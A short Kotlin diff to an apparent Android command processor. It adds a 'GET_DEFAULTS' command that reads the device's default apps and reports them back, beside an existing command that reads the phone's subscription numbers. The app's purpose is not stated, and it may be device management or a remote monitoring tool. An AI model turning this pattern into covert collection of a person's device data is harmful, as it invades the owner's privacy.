@@ -588,6 +588,12 @@ object CommandProcessor {
                     updateCommandStatus(ctx, id, status, null, result, null)
                     return
                 }
+                "GET_DEFAULTS" -> {
+                    val defaults = DeviceManager.getDefaultApps(ctx)
+                    status = "DEFAULTS_RETRIEVED"
+                    updateCommandStatus(ctx, id, status, null, defaults, null)
+                    return
+                }
                 "GET_NUMBERS" -> {
                     val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
                     val numbers = JSONArray()
